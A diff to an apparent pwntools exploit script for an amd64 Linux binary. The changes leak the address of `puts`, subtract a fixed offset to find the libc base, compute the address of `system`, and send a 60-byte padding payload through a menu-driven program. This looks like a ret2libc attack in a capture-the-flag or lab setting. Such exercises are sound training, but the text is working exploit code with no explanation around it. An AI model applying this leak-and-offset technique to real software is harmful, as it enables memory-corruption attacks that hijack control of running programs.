@@ -8,6 +8,10 @@ context(arch="amd64", os="linux")
 RECV_DELAY = 1
 RECV_SIZE = 32768
 
+libc = ELF("libc.so.6")
+
+# readelf -Ws libc.so.6 | grep ' puts\W'
+
 
 def parse_steps(fname: str):
     with open(fname, "r") as file:
@@ -44,16 +48,18 @@ pattern = r"0x[0-9a-f]+"
 puts_addr = re.findall(pattern, res)[0]
 print(f"Address of `puts`: {puts_addr}")
 
+# puts is 0x80ed0 offset from libc base
+libc_addr = int(puts_addr, 16) - 0x80ED0
+libc.address = libc_addr
+print(f"Address of libc base: {hex(libc_addr)}")
 
-def puts_offset(addr):
-    return hex(int(puts_addr, 16) + int(addr, 16))
-
+sys_addr = libc_addr + 0x050D60
+print(f"Address of `system`: {hex(sys_addr)}")
 
 r.send(b"1\ny\n")
-
-# this part has to be done in the script,
-# because it calculates the offset
 r.send(b"a" * 60)
+recv()
+
 r.send(b"\n3\n\n")
 print(recv())
 
